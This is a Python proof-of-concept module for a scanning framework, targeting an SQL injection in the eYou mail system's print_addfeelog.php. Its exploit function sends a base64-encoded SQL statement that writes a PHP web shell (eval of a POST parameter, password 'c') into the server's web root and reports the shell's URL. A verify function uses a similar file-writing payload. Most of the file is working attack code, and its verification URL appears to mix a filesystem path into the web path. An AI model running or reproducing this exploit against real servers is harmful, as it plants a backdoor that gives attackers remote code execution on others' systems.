# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'eYou_0011_p'  # 平台漏洞编号，留空
    name = 'eYou SQL注入getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-08-04'  # 漏洞公布时间
    desc = '''
        漏洞文件：\php\bill\print_addfeelog.php
        执行任意SQL命令，且不受GPC影响。
        默认MYSQL都是有权限导出文件权限的，可以导出一句话后门。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1922/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'eYou'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '29145101-efd9-4604-aff8-0ffbcecaff9f'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # payload路径根据实际情况确定
            # select '<?php echo md5(c)?>c' into outfile '/var/eyou/apache/htdocs/php/bill/script/index.php';
            payload = '/php/bill/print_addfeelog.php'
            headers = {
                'Cookie': 'cookie=1;'
            }
            data = 'all_sql=c2VsZWN0ICc8P3BocCBlY2hvIG1kNShjKT8+YycgaW50byBvdXRmaWxlICcvdmFyL2V5b3UvYXBhY2hlL2h0ZG9jcy9waHAvYmlsbC9zY3JpcHQvaW5kZXgucGhwJzs='
            url = self.target + payload
            requests.post(url, headers=headers, data=data)
            verify_url = self.target + '/var/eyou/apache/htdocs/php/bill/script/index.php'
            r = requests.get(verify_url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # payload路径根据实际情况确定
            # select '<?php echo md5(c); eval($_POST[c])?>c' into outfile '/var/eyou/apache/htdocs/php/bill/script/index.php';
            payload = '/php/bill/print_addfeelog.php'
            headers = {
                'Cookie': 'cookie=1;'
            }
            data = 'all_sql=c2VsZWN0ICc8P3BocCBlY2hvIG1kNShjKTsgZXZhbCgkX1BPU1RbY10pPz5jJyBpbnRvIG91dGZpbGUgJy92YXIvZXlvdS9hcGFjaGUvaHRkb2NzL3BocC9iaWxsL3NjcmlwdC9pbmRleC5waHAnOw=='
            url = self.target + payload
            requests.post(url, headers=headers, data=data)
            verify_url = self.target + '/var/eyou/apache/htdocs/php/bill/script/index.php'
            r = requests.get(verify_url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
